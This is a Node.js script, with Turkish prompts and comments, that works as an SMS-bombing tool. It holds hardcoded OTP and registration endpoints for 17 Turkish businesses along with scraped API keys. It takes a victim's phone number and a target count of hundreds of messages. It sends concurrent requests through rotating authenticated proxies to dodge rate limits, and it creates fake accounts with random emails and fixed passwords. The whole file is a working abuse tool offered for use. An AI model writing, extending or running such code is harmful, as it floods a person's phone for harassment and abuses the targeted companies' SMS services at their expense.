const fs = require('fs');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const readlineSync = require('readline-sync');
const REQUEST_TIMEOUT_MS = 8000;
class ProxyYoneticisi {
  constructor() {
    this.proxyler = [];
    this.suanki = 0;
    this.istatistik = new Map();
    this.checkCacheMs = 30 * 1000;
    this.proxyTestUrl = 'https://httpbin.org/get';
  }
  ekle(proxyUrl) {
    if (!proxyUrl) return;
    if (!this.proxyler.includes(proxyUrl)) {
      this.proxyler.push(proxyUrl);
      this.istatistik.set(proxyUrl, { basarili: 0, basarisiz: 0, sonKullanilma: null, aktif: true, sonKontrol: 0, sonKontrolOk: true });
      yaz(`Proxy eklendi: ${proxyUrl}`, 'success');
    }
  }
  ekleCok(list) {
    if (!Array.isArray(list)) return;
    list.forEach(p => { const t = String(p || '').trim(); if (t) this.ekle(t); });
  }
  liste() { return this.proxyler.slice(); }
  temizle() { this.proxyler = []; this.istatistik.clear(); this.suanki = 0; }
  istatistikGetir() { const s = {}; this.istatistik.forEach((v,k)=>s[k]=v); return s; }
  sonraki() {
    if (this.proxyler.length === 0) return null;
    const aktif = this.proxyler.filter(p => this.istatistik.get(p)?.aktif !== false);
    if (aktif.length === 0) { this.proxyler.forEach(p=>{const st=this.istatistik.get(p); if(st){st.aktif=true;st.sonKontrol=0}}); return this.proxyler[0]; }
    const proxy = aktif[this.suanki % aktif.length];
    this.suanki++;
    const st = this.istatistik.get(proxy); if (st) st.sonKullanilma = Date.now();
    return proxy;
  }
  rastgele() {
    if (this.proxyler.length === 0) return null;
    const i = Math.floor(Math.random()*this.proxyler.length);
    const p = this.proxyler[i]; const st = this.istatistik.get(p); if (st) st.sonKullanilma = Date.now(); return p;
  }
  kaydetBasarili(proxyUrl) { const s = this.istatistik.get(proxyUrl); if (s) { s.basarili++; s.aktif = true; s.sonKontrolOk = true; } }
  kaydetBasarisiz(proxyUrl) { const s = this.istatistik.get(proxyUrl); if (s) { s.basarisiz++; if (s.basarisiz > 10 && s.basarisiz > s.basarili * 3) { s.aktif = false; yaz(`Proxy devre disi: ${proxyUrl} (cok hata)`, 'warn'); } s.sonKontrolOk = false; } }
}
const proxyYoneticisi = new ProxyYoneticisi();
const DEBUG = true;
function yaz(msg, seviye='info') { if (!DEBUG) return; const renkler = { info: '\x1b[36m', success: '\x1b[32m', error: '\x1b[31m', warn: '\x1b[33m' }; const ts = new Date().toISOString().split('T')[1].split('.')[0]; console.log(`${renkler[seviye]||''}[${ts}] [${seviye.toUpperCase()}] ${msg}\x1b[0m`); }
function rastgeleString(len){ const chars='abcdefghijklmnopqrstuvwxyz0123456789'; let s=''; for(let i=0;i<len;i++) s+=chars[Math.floor(Math.random()*chars.length)]; return s; }
function rastgeleUUID(){ return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,c=>{const r=Math.random()*16|0,v=c=='x'?r:(r&0x3|0x8);return v.toString(16);}); }
function telNormalizeEt(raw){ let s=String(raw).replace(/\D/g,''); if(s.startsWith('90')&&s.length===12) return s.slice(2); if(s.startsWith('0')&&s.length===11) return s.slice(1); if(s.length===10) return s; return s; }
function proxyAjanOlustur(proxyUrl){ if(!proxyUrl) return null; try{ let url = proxyUrl; if(!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('socks')){ url = 'http://' + url; } if(url.startsWith('socks')) return new SocksProxyAgent(url); else return new HttpsProxyAgent(url); }catch(err){ yaz(`Proxy ajan hatasi: ${err.message}`, 'error'); return null; } }
function proxyKimlikAyarla(username, password){ global.PROXY_USERNAME = username; global.PROXY_PASSWORD = password; yaz(`Proxy auth ayarlandi: ${username}`, 'info'); }
function proxyUrlKimlikliGetir(proxyUrl){ if(!proxyUrl) return null; if(!global.PROXY_USERNAME || !global.PROXY_PASSWORD) return proxyUrl; try{ let url = proxyUrl; if(!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('socks')){ url = 'http://' + url; } const parsed = new URL(url); parsed.username = global.PROXY_USERNAME; parsed.password = global.PROXY_PASSWORD; return parsed.toString(); }catch(err){ return proxyUrl; } }
function cfg_filemarket(phone) {
  return {
    url: 'https://api.filemarket.com.tr/v1/otp/send',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)'
    },
    data: { mobilePhoneNumber: `90${phone}` },
    validate: (r) => r.data?.data === "200 OK" || r.status === 200
  };
}
function cfg_kimgbister(phone) {
  return {
    url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    data: { msisdn: `90${phone}` },
    validate: (r) => r.status === 200
  };
}
function cfg_tiklagelsin(phone) {
  const challenge = rastgeleUUID();
  const deviceId = `web_${rastgeleUUID()}`;
  return {
    url: 'https://www.tiklagelsin.com/user/graphql',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15',
      'Origin': 'https://www.tiklagelsin.com',
      'Referer': 'https://www.tiklagelsin.com/'
    },
    data: {
      operationName: "GENERATE_OTP",
      variables: {
        phone: `+90${phone}`,
        challenge: challenge,
        deviceUniqueId: deviceId
      },
      query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"
    },
    validate: (r) => r.status === 200 && !r.data?.errors
  };
}
function cfg_bim(phone) {
  return {
    url: 'https://bim.veesk.net/service/v1.0/account/login',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    data: { phone: phone },
    validate: (r) => r.status === 200
  };
}
function cfg_bodrum(phone) {
  return {
    url: 'https://gandalf.orwi.app/api/user/requestOtp',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'Accept-Language': 'en-GB,en;q=0.9',
      'Apikey': 'Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE',
      'Origin': 'capacitor://localhost',
      'Region': 'EN',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15'
    },
    data: { gsm: `+90${phone}`, source: "bodrum" },
    validate: (r) => r.status === 200 || r.data?.success === true
  };
}
function cfg_dominos(phone, mail) {
  return {
    url: 'https://frontend.dominos.com.tr/api/customer/sendOtpCode',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json;charset=utf-8',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0',
      'Appversion': 'IOS-7.1.0',
      'Servicetype': 'CarryOut'
    },
    data: { 
      email: mail || `${rastgeleString(8)}@hotmail.com`, 
      isSure: false, 
      mobilePhone: phone 
    },
    validate: (r) => r.data?.isSuccess === true || r.status === 200
  };
}
function cfg_komagene(phone) {
  return {
    url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'Accept': '*/*',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)',
      'Referer': 'https://www.komagene.com.tr/',
      'Origin': 'https://www.komagene.com.tr',
      'Anonymousclientid': rastgeleUUID(),
      'Firmaid': '32',
      'X-Guatamala-Kirsallari': '@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq'
    },
    data: { FirmaId: 32, Telefon: `90${phone}` },
    validate: (r) => r.data?.Success === true || r.status === 200
  };
}
function cfg_evidea(phone, mail) {
  const boundary = 'fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi';
  const email = mail || `${rastgeleString(8)}@hotmail.com`;
  
  const parts = [
    `--${boundary}`,
    'content-disposition: form-data; name="first_name"',
    '',
    'thomas',
    `--${boundary}`,
    'content-disposition: form-data; name="last_name"',
    '',
    'can',
    `--${boundary}`,
    'content-disposition: form-data; name="email"',
    '',
    email,
    `--${boundary}`,
    'content-disposition: form-data; name="email_allowed"',
    '',
    'false',
    `--${boundary}`,
    'content-disposition: form-data; name="sms_allowed"',
    '',
    'true',
    `--${boundary}`,
    'content-disposition: form-data; name="password"',
    '',
    '31ABC.abc31',
    `--${boundary}`,
    'content-disposition: form-data; name="phone"',
    '',
    `0${phone}`,
    `--${boundary}`,
    'content-disposition: form-data; name="confirm"',
    '',
    'true',
    `--${boundary}--`
].join('\n');

  return {
    url: 'https://www.evidea.com/users/register/',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Accept': 'application/json, text/plain, */*',
      'X-Project-Name': 'undefined',
      'X-App-Type': 'akinon-mobile',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0',
      'X-App-Device': 'ios',
      'Referer': 'https://www.evidea.com/'
    },
    data: parts,
    validate: (r) => r.status === 202 || r.status === 200
  };
}
function cfg_kofteciyusuf(phone) {
  return {
    url: 'https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Accept': 'application/json',
      'User-Agent': 'YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0',
      'Ostype': 'iOS',
      'Appversion': '4.0.4.0',
      'Firmaid': '82',
      'Anonymousclientid': rastgeleUUID(),
      'X-Guatamala-Kirsallari': '@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq',
      'Language': 'tr-TR'
    },
    data: {
      FireBaseCihazKey: null,
      FirmaId: 82,
      GuvenlikKodu: null,
      Telefon: `90${phone}`
    },
    validate: (r) => r.data?.Success === true || r.status === 200
  };
}
function cfg_yapp(phone, mail) {
  return {
    url: 'https://yapp.com.tr/api/mobile/v1/register',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
      'X-Content-Language': 'en',
      'User-Agent': 'YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)',
      'Accept-Language': 'en-BA;q=1, tr-BA;q=0.9'
    },
    data: {
      app_version: "1.1.5",
      code: "tr",
      device_model: "iPhone8,5",
      device_name: "thomas",
      device_type: "I",
      device_version: "15.8.3",
      email: mail || `${rastgeleString(8)}@hotmail.com`,
      firstname: "shelby",
      is_allow_to_communication: "1",
      language_id: "2",
      lastname: "yilmaz",
      phone_number: phone,
      sms_code: ""
    },
    validate: (r) => r.status === 200
  };
}
function cfg_uysal(phone) {
  return {
    url: 'https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json;charset=utf-8',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
      'Origin': 'https://www.uysalmarket.com.tr',
      'Referer': 'https://www.uysalmarket.com.tr/'
    },
    data: { phone_number: phone },
    validate: (r) => r.status === 200 || r.data?.success === true
  };
}
function cfg_ucdortbes(phone) {
  return {
    url: 'https://api.345dijital.com/api/users/register',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'User-Agent': 'AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0',
      'Accept-Language': 'en-US,en;q=0.9',
      'Authorization': 'null'
    },
    data: {
      email: "",
      name: "thomas",
      phoneNumber: `+90${phone}`,
      surname: "Bas"
    },
    validate: (r) => {
      if (r.data?.error === "E-Posta veya telefon zaten kayitli!") return false;
      return r.status === 200 || !r.data?.error;
    }
  };
}
function cfg_suiste(phone) {
  const params = new URLSearchParams({
    action: 'register',
    device_id: rastgeleUUID(),
    full_name: 'thomas yilmaz',
    gsm: phone,
    is_advertisement: '1',
    is_contract: '1',
    password: 'thomas31'
  });

  return {
    url: 'https://suiste.com/api/auth/code',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
      'Accept': 'application/json',
      'User-Agent': 'suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1',
      'X-Mobillium-Device-Brand': 'Apple',
      'X-Mobillium-Os-Type': 'iOS',
      'X-Mobillium-Device-Model': 'iPhone',
      'X-Mobillium-App-Version': '1.7.11'
    },
    data: params.toString(),
    validate: (r) => r.data?.code === "common.success" || r.status === 200
  };
}
function cfg_porty(phone) {
  return {
    url: 'https://panel.porty.tech/api.php?',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Accept': '*/*',
      'Content-Type': 'application/json; charset=UTF-8',
      'User-Agent': 'Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
      'Token': 'q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ'
    },
    data: { job: "start_login", phone: phone },
    validate: (r) => r.data?.status === "success" || r.status === 200
  };
}
function cfg_orwi(phone) {
  return {
    url: 'https://gandalf.orwi.app/api/user/requestOtp',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'Accept-Language': 'en-GB,en;q=0.9',
      'Apikey': 'YWxpLTEyMzQ1MTEyNDU2NTQzMg',
      'Origin': 'capacitor://localhost',
      'Region': 'EN',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15'
    },
    data: { gsm: `+90${phone}`, source: 'orwi' },
    validate: (r) => r.status === 200 || r.data?.success === true
  };
}
function cfg_naosstars(phone) {
  return {
    url: 'https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Accept': 'application/json',
      'User-Agent': 'naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0',
      'Uniqid': '9c9fa861-cc5d-43c0-b4ea-1b541be15351',
      'Locale': 'en-TR',
      'Version': '1.0030',
      'Os': 'ios',
      'Platform': 'ios',
      'Device-Id': rastgeleUUID(),
      'Globaluuidv4': rastgeleUUID(),
      'Timezone': 'Europe/Istanbul',
      'Timezoneoffset': '-180',
      'Apitype': 'mobile_app'
    },
    data: { telephone: `+90${phone}`, type: 'register' },
    validate: (r) => r.status === 200
  };
}
function cfg_metro(phone) {
  return {
    url: 'https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend',
    method: 'post',
    timeout: REQUEST_TIMEOUT_MS,
    headers: {
      'Accept': '*/*',
      'Content-Type': 'application/json; charset=utf-8',
      'User-Agent': 'Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1',
      'Applicationversion': '2.4.1',
      'Applicationplatform': '2',
      'Accept-Language': 'en-BA;q=1.0, tr-BA;q=0.9'
    },
    data: { methodType: "2", mobilePhoneNumber: phone },
    validate: (r) => r.data?.status === "success" || r.status === 200
  };
}
const ISLEYICILER = {
  filemarket: cfg_filemarket,
  kimgbister: cfg_kimgbister,
  tiklagelsin: cfg_tiklagelsin,
  bim: cfg_bim,
  bodrum: cfg_bodrum,
  dominos: cfg_dominos,
  komagene: cfg_komagene,
  evidea: cfg_evidea,
  kofteciyusuf: cfg_kofteciyusuf,
  yapp: cfg_yapp,
  uysal: cfg_uysal,
  ucdortbes: cfg_ucdortbes,
  suiste: cfg_suiste,
  porty: cfg_porty,
  orwi: cfg_orwi,
  naosstars: cfg_naosstars,
  metro: cfg_metro
};
const API_ANAHTARLARI = Object.keys(ISLEYICILER);
async function apiCagirAnahtar(key, phone, proxyUrl=null){ if(!ISLEYICILER[key]) throw new Error('Unknown handler: '+key); const cfg = ISLEYICILER[key](phone, `${rastgeleString(8)}@hotmail.com`); try{ const axiosCfg = { url:cfg.url, method:cfg.method||'post', timeout:cfg.timeout||REQUEST_TIMEOUT_MS, headers:cfg.headers||{}, data:cfg.data, validateStatus:()=>true }; if(proxyUrl){ const agent = proxyAjanOlustur(proxyUrl); if(agent){ axiosCfg.httpAgent = agent; axiosCfg.httpsAgent = agent; } } const r = await axios(axiosCfg); if(cfg.validate){ const ok = cfg.validate(r); if(ok && proxyUrl) proxyYoneticisi.kaydetBasarili(proxyUrl); else if(!ok && proxyUrl) proxyYoneticisi.kaydetBasarisiz(proxyUrl); return { ok, status:r.status, data:r.data, proxy: proxyUrl||'direct' }; } const isSuccess = r.status>=200 && r.status<300; if(proxyUrl){ if(isSuccess) proxyYoneticisi.kaydetBasarili(proxyUrl); else proxyYoneticisi.kaydetBasarisiz(proxyUrl); } return { ok:isSuccess, status:r.status, data:r.data, proxy: proxyUrl||'direct' }; }catch(err){ if(proxyUrl) proxyYoneticisi.kaydetBasarisiz(proxyUrl); yaz(`${key} error: ${err.message}`, 'error'); return { ok:false, error: err.message||String(err), proxy: proxyUrl||'direct' }; } }
class Semafor{ constructor(max){ this.max=max; this.count=0; this.queue=[];} async acquire(){ if(this.count<this.max){ this.count++; return; } await new Promise(resolve=>this.queue.push(resolve)); this.count++; } release(){ this.count--; if(this.queue.length){ const n = this.queue.shift(); n(); } } }
function proxyDosyasiYukle(filepath='workproxy.txt'){ try{ const p = require('path').resolve(process.cwd(), filepath); if(!fs.existsSync(p)){ yaz(`${filepath} bulunamadi, proxy.txt deneniyor...`, 'warn'); const alt = require('path').resolve(process.cwd(), 'proxy.txt'); if(fs.existsSync(alt)){ filepath='proxy.txt'; } else { return; } } const raw = fs.readFileSync(require('path').resolve(process.cwd(), filepath),'utf8'); const lines = raw.split(/\r?\n/).map(l=>l.trim()).filter(Boolean); proxyYoneticisi.ekleCok(lines); yaz(`${filepath} yuklendi: ${lines.length} proxy`, 'info'); }catch(err){ yaz(`Proxy yukleme hatasi: ${err.message}`, 'warn'); } }
async function calistirArac(){ console.clear();
 const banner = [
"   _____ __  _______   ____  ____  ____  __   _____ __  ________",
"  / ___// / / /  _/ | / /\ \/ / / / / / / /  / ___//  |/  / ___/",
"  \__ \/ /_/ // //  |/ /  \  / / / / / / /   \__ \/ /|_/ /\__ \ ",
" ___/ / __  // // /|  /   / / /_/ / /_/ /   ___/ / /  / /___/ /",
"/____/_/ /_/___/_/ |_/   /_/\____/\____/   /____/_/  /_//____/"

].join('\n');
 const alt = "\n   CODER: vulnex.\n";
 console.log('\x1b[35m' + banner + '\x1b[0m' + '\n' + '\x1b[36m' + alt + '\x1b[0m');
 const telnogir = readlineSync.question('Telefon numarasini giriniz kanzi orn :(5555555555): ');
 const telefon = telNormalizeEt(telnogir);
 if(!telefon){ console.log('Gecersiz telefon nosu düzgün gir'); return; }
 const secim = readlineSync.question('Proxyli mi calistirilsin proxyin yoksa h sec? (E/H): ');
 const proxyli = String(secim||'').toLowerCase().startsWith('e');
 if(proxyli){ const authSecim = readlineSync.question('Proxy authentication (user:pass seklinde) gerekli mi? (E/H): '); if(String(authSecim||'').toLowerCase().startsWith('e')){ const proxyUser = readlineSync.question('Proxy kullanici adi: '); const proxyPass = readlineSync.question('Proxy sifre: ', {hideEchoBack: true}); proxyKimlikAyarla(proxyUser, proxyPass); } }
 const maxBasarili = Number(readlineSync.question('Gondermek istedigin sms sayisini gir (300-400 iyidir): ') || '300');
 const isciSayisi = Math.min(Math.max(Number(readlineSync.question('Worker sayisi (default 6-12): ') || '6'),1),50);
 proxyDosyasiYukle(); if(proxyli && proxyYoneticisi.liste().length===0){ console.log('Proxyli modu secildi fakat proxy.txt bulunamadi veya bos hallet sunu'); return; }
 let basarili=0, basarisiz=0, deneme=0; const perApiBas = {}; const perApiFail = {}; const perApiHata = {}; const proxyKullanim = {}; API_ANAHTARLARI.forEach(k=>{ perApiBas[k]=0; perApiFail[k]=0; perApiHata[k]=[]; }); let idx=0; const sem = new Semafor(isciSayisi); let stop=false; async function isciDongu(id){ while(!stop){ if(basarili>=maxBasarili){ stop=true; break; } await sem.acquire(); const apiKey = API_ANAHTARLARI[idx]; idx = (idx+1)%API_ANAHTARLARI.length; deneme++; let kullanilanProxy = null; if(proxyli) kullanilanProxy = proxyYoneticisi.rastgele(); if(!proxyli && proxyYoneticisi.liste().length>0 && Math.random()<0.1) kullanilanProxy = null; if(kullanilanProxy){ let authProxy = proxyUrlKimlikliGetir(kullanilanProxy); proxyKullanim[kullanilanProxy] = (proxyKullanim[kullanilanProxy]||0)+1; kullanilanProxy = authProxy; }
 try{ const res = await apiCagirAnahtar(apiKey, telefon, kullanilanProxy); if(res.ok){ basarili++; perApiBas[apiKey]++; yaz(`✅ ${apiKey} via ${res.proxy} - Basarili (${basarili}/${maxBasarili})`, 'success'); } else { basarisiz++; perApiFail[apiKey]++; const errMsg = res.error || `Status: ${res.status}`; perApiHata[apiKey].push(errMsg); yaz(`❌ ${apiKey} via ${res.proxy} - Basarisiz: ${errMsg}`, 'error'); } }catch(err){ basarisiz++; perApiFail[apiKey]++; perApiHata[apiKey].push(err.message); yaz(`❌ ${apiKey} - Exception: ${err.message}`, 'error'); } finally{ sem.release(); }
 if(basarili>=maxBasarili){ stop=true; break; }
 await new Promise(r=>setTimeout(r, 50 + Math.floor(Math.random()*150))); }
 }
 const gorevler = []; const start = Date.now(); for(let i=0;i<isciSayisi;i++) gorevler.push(isciDongu(i)); await Promise.all(gorevler); const duration = ((Date.now()-start)/1000).toFixed(2);
 console.log('\n=== SONUC ==='); console.log(`Telefon: ${telefon}`); console.log(`Deneme: ${deneme}`); console.log(`Basarili: ${basarili}`); console.log(`Basarisiz: ${basarisiz}`); console.log(`Sure: ${duration}s`); console.log('API Basari Dagilimi:', perApiBas); console.log('Proxy Kullanimi (ilk 10):', Object.entries(proxyKullanim).slice(0,10)); console.log('\nDetayli hata ornekleri:'); Object.entries(perApiHata).forEach(([k,errs])=>{ if(errs.length) console.log(k, errs.slice(0,3)); }); }
calistirArac().catch(err=>{ console.error('Arac calistirma hatasi:', err); process.exit(1); });
